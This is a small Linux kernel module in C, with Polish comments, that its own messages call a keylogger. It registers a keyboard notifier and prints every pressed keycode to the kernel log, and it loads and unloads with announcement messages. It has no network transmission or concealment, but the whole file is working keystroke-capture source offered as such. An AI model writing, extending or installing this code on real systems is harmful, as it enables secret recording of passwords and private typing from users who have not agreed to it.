#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/uaccess.h>  // dla copy_to_user()

static struct notifier_block nb;

static int log_key_event(struct notifier_block *nb, unsigned long action, void *data)
{
    struct keyboard_notifier_param *param = data;

    if (action == KBD_KEYCODE) {
        // Zarejestruj klawisz
        printk(KERN_INFO "Key pressed: %d\n", param->value);
    }

    return NOTIFY_OK;
}

static int __init keylogger_init(void)
{
    nb.notifier_call = log_key_event;
    register_keyboard_notifier(&nb);

    printk(KERN_INFO "Keylogger module loaded.\n");

    return 0;
}

static void __exit keylogger_exit(void)
{
    unregister_keyboard_notifier(&nb);
    printk(KERN_INFO "Keylogger module unloaded.\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");

